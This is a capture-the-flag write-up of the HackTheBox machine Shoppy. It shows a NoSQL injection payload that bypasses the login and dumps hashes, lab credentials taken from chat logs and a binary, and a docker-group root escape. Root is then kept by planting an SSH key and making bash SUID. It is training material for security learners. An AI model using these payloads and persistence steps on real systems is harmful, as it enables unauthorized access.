![Shoppy](https://0xdfimages.gitlab.io/img/shoppy-cover.png)

Shoppy was one of the easier HackTheBox weekly machines to exploit, though identifying the exploits for the initial foothold could be a bit tricky. I’ll start by finding a website and use a NoSQL injection to bypass the admin login page, and another to dump users and hashes. With a cracked hash, I’ll log into a Mattermost server where I’ll find creds to the box that work for SSH. From there, I’ll need the lighest of reverse enginnering to get a static password from a binary, which gets me to the next user. This user is in the docker group, so I’ll load an image mounting the host file system, and get full disk access. I’ll show two ways to get a shell from that. In Beyond Root, a video walkthrough of the vulnerable web-server code, showing how the injections worked, and fixing them.

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), the host is likely running Debian 11 bullseye. Port 80 shows a redirect to `shoppy.htb`.

### Subdomain Fuzz

Given the use of DNS names, I’ll see if the server responds differently to any subdomains with `wfuzz`. By first running with no filter, I can check the default response:

```

oxdf@hacky$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

```

Seems like 169 characters is the default, so I’ll filter that with `--hh 169`:

```

oxdf@hacky$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169

```

I’ll add both `shoppy.htb` and `mattermost.shoppy.htb` to my `/etc/hosts` file:

```
10.10.11.180 shoppy.htb mattermost.shoppy.htb

```

### shoppy.htb - TCP 80

#### Site

The site just says that the store is coming soon:

[![image-20230110194211994](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)

#### Tech Stack

I’ll guess at file names for the default path, with things like `/index.html`, `index.php`, and find nothing. This doesn’t tell me what the technology stack is, but it suggests it’s not PHP, and likely not just a static site, but likely some framework that assigns routes.

The HTTP response headers don’t give any additional information.

#### Directory Brute Force

I’ll run `feroxbuster` against the site to look for paths on the site that aren’t linked:

```

oxdf@hacky$ feroxbuster -u http://shoppy.htb

```

`/admin` and `/login` are the most interesting (though the former just redirects to the latter)

#### /login

`/login` gives a login form:

![image-20230111115916994](https://0xdfimages.gitlab.io/img/image-20230111115916994.png)

Testing a few guesses, there’s no obvious difference between non-existent user and wrong password (though I don’t know for sure there is an admin user). Everything I put in just return “Wrong Credentials”:

![image-20230111120034398](https://0xdfimages.gitlab.io/img/image-20230111120034398.png)

### mattermost.shoppy.htb - TCP 80

#### Site

This looks like an instance of [Mattermost](https://github.com/mattermost/mattermost-server), an open source Slack alternative. Visiting redirects to a login form at `/login`:

![image-20230111120420590](https://0xdfimages.gitlab.io/img/image-20230111120420590.png)

#### Tech Stack

The headers show that it is still NGINX, but not much else:

```

HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Wed, 11 Jan 2023 17:03:01 GMT
Content-Type: text/html; charset=utf-8

X-Version-Id: 7.1.2.7.1.2.c5e71b88555e841d57187938dfbf41ec.false

```

I’ll poke at the page source and the JavaScript files a bit for any clue about the version it’s running, but without luck.

The copyright at the bottom of the page says 2023 (which is after the box was released), so it must be updating dynamically.

#### Vulnerabilities

I’ll skip the directory brute force here, focusing on looking for potential vulnerabilities. Neither Google nor `searchsploit` find anything of value. All the CVEs are low impact. I’ll have to come back here once I find some credentials and can login.

### HTTP - TCP 9093

Visiting this over HTTP returns some kind of log:

[![image-20230111122430910](https://0xdfimages.gitlab.io/img/image-20230111122430910.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20230111122430910.png)

Trying to figure out what this was sent me down a bit of a rabbit hole. Port 9093 is associated with the Prometheus AltertManager Plugin for Mattermost, so that could be it.

It mentions `playbook_plugin_process` many times down in the file. That could be a [Mattermost thing](https://github.com/mattermost/mattermost-plugin-playbooks) as well.

No matter what it is, there isn’t much information here that seems too useful to me.

## Shell as jaeger

### Admin Auth ByPass

#### Not SQL Injection

I always quickly jam a few SQL injection payloads into a form when I see one. In this case, I’ll send the login request to Burp Repeater and try adding a simple `'`. The request hangs for a full minute, then returns a 504 Gateway Time-out:

![image-20230111170636986](https://0xdfimages.gitlab.io/img/image-20230111170636986.png)

This suggests the server is having a really hard time with that request, and it could be nothing, or it could be something.

No other SQL injection payloads I try return anything different.

#### NoSQL Failures

Given that `'` is messing up the server, I’ll look at NoSQL as well. One way to try this would be with something like I showed in [Mango](/2020/04/18/htb-mango.html#nosql-inejction-login-bypass):

```

username[$ne]=admin&password[$ne]=admin

```

That doesn’t work here, and hangs just the same.

Another way would be to convert to JSON. I’ll change the `Content-Type` header as well as the payload itself. Without an injection, this works fine (returning the 302 saying it failed login):

![image-20230111174837315](https://0xdfimages.gitlab.io/img/image-20230111174837315.png)

Now I can try the method that worked in [NodeBlog](/2022/01/10/htb-nodeblog.html#auth-bypass-via-nosql-injection), but it hangs, and eventually returns a timeout:

![image-20230113092744407](https://0xdfimages.gitlab.io/img/image-20230113092744407.png)

At one point I did accidentally send the `"$ne"` without the `"` around it, which returned a 400:

![image-20230111175106255](https://0xdfimages.gitlab.io/img/image-20230111175106255.png)

Rending this response shows an error trace:

![image-20230111175234942](https://0xdfimages.gitlab.io/img/image-20230111175234942.png)

It doesn’t like the `$` character, and it’s at the JSON parsing level, before it gets to a potential DB call. Seems like a deadend there. But I did leak some interesting information:
- Username on box jaeger
- App is running out of `/home/jaeger/ShoppyApp`

Neither of these end up important to getting a foothold, but this is the kind of information that could be useful in general.

#### NoSQL Injection Success

There’s a method of attacking NoSQL queries that looks much more like SQL injection which I find in [this article](https://nullsweep.com/a-nosql-injection-primer-with-mongo/) from Null Sweep. I wanted to try the tool described in this post ([nosqli](https://github.com/Charlie-belmer/nosqli)), but the hang when sending many payloads causes the tool to fail.

At the bottom of the article, they give this example:

```

let username = req.query.username;
query = { $where: `this.username == '${username}'` }
User.find(query, function (err, users) {
	if (err) {
		// Handle errors
	} else {
		res.render('userlookup', { title: 'User Lookup', users: users });
	}
});

```

And they show how they can get all the users with `' || 'a'=='a`.

I like to try payloads like this in the `username` field, since hopefully the password field is going to be hashes before it is used. Going back to this payload (and seeing `Content-Type` back to `application/x-www-form-urlencoded`):

```

username=admin' || 'a'=='a&password=admin

```

Results in:

```

HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Wed, 11 Jan 2023 23:00:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
Location: /admin
Vary: Accept
Set-Cookie: connect.sid=s%3AReILweHHX4bMBcDk4TiDrE3ATGvqbBnT.1x8gE%2Fp%2FM79FzOS6DQvwdmngxdyyyvT637dxIsReuZQ; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/admin">/admin</a></p>

```

That’s a cookie set and a redirect to `/admin`! That’s success.

Interestingly, this only works if the username exists. If I change the payload to:

```

username=0xdf' || 'a'=='a&password=admin

```

It redirects with “Wrong Credentials”.

I’ll dig into this and another NoSQL vulnerability in [Beyond Root](#beyond-root---nosql-injection).

### Access to Mattermost

#### Enumeration

Either by grabbing the cookie from Repeater or just logging in from Firefox with the NoSQL payload, I get into the admin panel:

![image-20230111180655873](https://0xdfimages.gitlab.io/img/image-20230111180655873.png)

That page looks relatively static. The “Search for users” button leads to `/admin/search-users`:

![image-20230111180733256](https://0xdfimages.gitlab.io/img/image-20230111180733256.png)

If I search for “0xdf”, it finds nothing. If I search for “admin”, it offers a download:

![image-20230111181009832](https://0xdfimages.gitlab.io/img/image-20230111181009832.png)

It opens `export-search.json`, which contains admin’s id, username, and password:

![image-20230111181054611](https://0xdfimages.gitlab.io/img/image-20230111181054611.png)

The hash looks like MD5, but doesn’t crack with `rockyou.txt`.

#### NoSQL Injection Again

The app has already shown itself vulnerable to NoSQL injection, so I’ll try again:

![image-20230111204649798](https://0xdfimages.gitlab.io/img/image-20230111204649798.png)

This would get a record if the name is admin or if 1==1, which is always true! It works, the resulting file has a second account it in:

![image-20230111204752869](https://0xdfimages.gitlab.io/img/image-20230111204752869.png)

#### Crack Hash

MD5 hashes (which are 32 hex characters in length like this one) are not salted or anything, so the hash of the same input is always the same. Wordlists like rockyou (which is what is typically used in HTB) have already had all their hashes stored in rainbow tables which are accessible thought things like [crackstation](https://crackstation.net/).

It comes back instantly:

#### Creds for Jaeger

Reading the different channels, most is just small talk, but two channels have interesting information.

The two interesting speakers in the chat are Josh and Jaeger. Josh’s profile shows that they are a developer, and Jaeger is the CEO:

![image-20230111205619844](https://0xdfimages.gitlab.io/img/image-20230111205619844.png)

In the public channel “Development”, Josh talks about making a password manager in C++. I’ll keep an eye out for this when I get a shell:

![image-20230112064608129](https://0xdfimages.gitlab.io/img/image-20230112064608129.png)

The “Deploy Machine” private channel has another conversation between Josh and Jaeger. Jaeger asks for a machine set up with a username and password:

![image-20230111205719085](https://0xdfimages.gitlab.io/img/image-20230111205719085.png)

### SSH

With those creds, I can SSH into the box as jaeger:

```

oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;

permitted by applicable law.
jaeger@shoppy:~$

```

And read `user.txt`:

```

jaeger@shoppy:~$ cat user.txt
91e995e9************************

```

## Shell as deploy

### Enumeration

jaeger can run `/home/deploy/password-manager` as deploy:

```

jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

```

`/home/deploy` has the binary, as well as the source and a `creds.txt`:

```

jaeger@shoppy:~$ ls -l ../deploy/
total 28
-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp

```

As jaeger, I can only read the binary. With `sudo`, I can also run it as deploy:

```

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: 0xdf
Access denied! This incident will be reported !

```

I’ll copy it back to my machine with `scp`:

```

oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' scp jaeger@shoppy.htb:/home/deploy/password-manager .

```

### Reverse Engineering

#### Ghidra

The binary is a 64-bit ELF:

```

oxdf@hacky$ file password-manager 
password-manager: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped

```

I’ll open it in Ghidra to take a look. C++ is a mess in Ghidra, but the program is very simple.

It prints the welcome and and password prompt:

![image-20230112071724418](https://0xdfimages.gitlab.io/img/image-20230112071724418.png)

Next it creates a string and saves my input into it:

![image-20230112071747211](https://0xdfimages.gitlab.io/img/image-20230112071747211.png)

Now it creates another string and appends the characters “S”, “a”, “m”, “p”, “l”, “e” to it:

![image-20230112071911570](https://0xdfimages.gitlab.io/img/image-20230112071911570.png)

It compares the input to “Sample”, and if they don’t match (non-zero return in `pass_match`), print the “Access denied!” message:

![image-20230112072051191](https://0xdfimages.gitlab.io/img/image-20230112072051191.png)

Otherwise, it prints “Access granted”, and then calls `system("cat /home/deploy/creds.txt")`:

![image-20230112072132236](https://0xdfimages.gitlab.io/img/image-20230112072132236.png)

#### strings

Originally I did try running strings on the binary, but didn’t see anything that looked like a password. Only after solving when chatting with IppSec did he point out that I should also check 16-bit character strings, and there it is (the only 16-bit character string):

```

oxdf@hacky$ strings -el password-manager 
Sample

```

### su

With that information, I’ll run the binary again on Shoppy and it prints creds for deploy:

```

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

```

`su` allows me to switch users with their password:

```

jaeger@shoppy:~$ su deploy
Password: 
$ bash
deploy@shoppy:/home/jaeger$

```

deploy seems to have `sh` as their default shell, but I’ll switch to `bash`. I can see this in the `/etc/passwd` file:

```

deploy@shoppy:/home/jaeger$ cat /etc/passwd | grep deploy
deploy:x:1001:1001::/home/deploy:/bin/sh

```

## Shell as root

### Enumeration

There aren’t any other interesting files in `/home/deploy`, and nothing else on the file system jumps out.

deploy is in one additional group:

```

deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)

```

`docker` is installed on the box, and because deploy it in the `docker` group, they can interact with it, though no containers are running:

```

deploy@shoppy:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

```

There is one image on the box, [apline](https://hub.docker.com/_/alpine), a very small image with limited functionality:

```

deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   5 months ago   5.53MB

```

### Access Filesystem as root

#### Basic

The exploit here is to create a new container that has the entire file system mounted into it. In that container, I’ll be root, and thus have full access to all the files in the container (including the full host filesystem).

I’ve shown this several times with `lxc` before, but never like this with Docker ([GoodGames](/2022/02/23/htb-goodgames.html#shell-1) is the closest example).

I’ll start the container with `docker run` and the following options:
- `--rm` - remove the container when it’s done
- `-it` - keep STDIN open and assign a PTTY
- `-v /:/mnt` - mount the host `/` to `/mnt` inside the container

I’ll also give it the image name (alpine) and the command to run `/bin/sh` (no `bash` on Alpine). With these, I can start the image and find the host file system in `/mnt`:

```

deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine /bin/sh
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # ls /mnt/
bin             dev             home            initrd.img.old  lib32           libx32          media           opt             root            sbin            sys             usr             vmlinuz
boot            etc             initrd.img      lib             lib64           lost+found      mnt             proc            run             srv             tmp             var             vmlinuz.old

```

#### Neat Upgrade

A neat trick from the [Docker GTFObins page](https://gtfobins.github.io/gtfobins/docker/) is to use `chroot` instead of `sh` as the command. I don’t really need anything in the container filesystem. So I’ll call `chroot /mnt /bin/sh` (giving it a command to run as well, see the [man page](https://linux.die.net/man/1/chroot)). This will set the root of the filesystem to be what was `/mnt`, and then run a shell. This gives the feel as if I’m just back on the host:

```

deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old

```

#### Read Flag

From here I can read `root.txt`:

```

# cat /root/root.txt
5c6e2d67************************

```

### Shell

#### SSH

The simplest way to get a shell as root is to drop my public SSH key into an `authorized_keys` file for root:

```

# mkdir /root/.ssh
# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys 
# chmod 600 /root/.ssh/authorized_keys

```

Now I can connect with SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@shoppy.htb
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

root@shoppy:~#

```

#### SUID bash

A perhaps quieter way is to make `bash` SetUID:

```

# chmod 4777 /bin/bash

```

Because I’m working from the `chroot` file system, that `bash` is on the host. Exiting the container, I can verify it worked because the first `x` is now `s`:

```

deploy@shoppy:~$ ls -l /bin/bash
-rwsrwxrwx 1 root root 1234376 Mar 27  2022 /bin/bash

```

Running it (with `-p` to not drop privs) gives a shell with the effective id of root:

```

deploy@shoppy:~$ bash -p
bash-5.1# id
uid=1001(deploy) gid=1001(deploy) euid=0(root) groups=1001(deploy),998(docker)

```

## Beyond Root - NoSQL Injection

In [this video](https://www.youtube.com/watch?v=EfLW51f6KFo), I’ll use VSCode to connect to Shoppy, and analyze the NodeJS code for the website to better understand the NoSQL injections. Then I’ll fix the vulnerabilities and show that they no longer are exploitable:

One thing I didn’t go into in the video was how the boolean logic works for this injection. With the injection `admin'||'a'=='a`, the query becomes:

```

this.username == 'admin' || 'a'=='a' && this.password == '0xdf'

```

That is:

```

true || true && false

```

How does that evaluate? I can check it in a browser:

![image-20230113094927242](https://0xdfimages.gitlab.io/img/image-20230113094927242.png)

But why does it work? The [Operator Precedence](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#table) for JavaScript groups operators into groups numbered 1-18, which are processed from 18 down to 1. Logical AND (`&&`) is group 4, and Logical OR (`||`) is in group 3:

![image-20230113095139932](https://0xdfimages.gitlab.io/img/image-20230113095139932.png)

So for the user admin, the query can be simplified a bit on each line:

```

this.username == 'admin' || 'a'=='a' && this.password == '0xdf'
true || true && false
true || false
true

```
